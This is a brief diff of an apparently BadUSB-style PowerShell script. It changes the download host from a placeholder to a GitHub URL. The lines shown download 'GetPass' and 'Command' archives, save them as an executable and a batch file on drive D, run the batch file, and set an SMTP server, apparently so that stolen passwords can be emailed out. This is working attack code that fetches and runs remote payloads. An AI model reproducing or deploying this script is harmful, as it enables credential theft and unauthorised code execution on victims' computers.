@@ -1,6 +1,6 @@
-(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/GetPass.rar','D:\Get.exe');
+(new-object System.Net.WebClient).DownloadFile('https://github.com/Xyntax/BadUSB-code/GetPass.rar','D:\Get.exe');
 
-(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/Command.rar','D:\Command.bat');
+(new-object System.Net.WebClient).DownloadFile('https://github.com/Xyntax/BadUSB-code/Command.rar','D:\Command.bat');
 
 D:\Command.bat;
 $SMTPServer = 'smtp.qq.com'
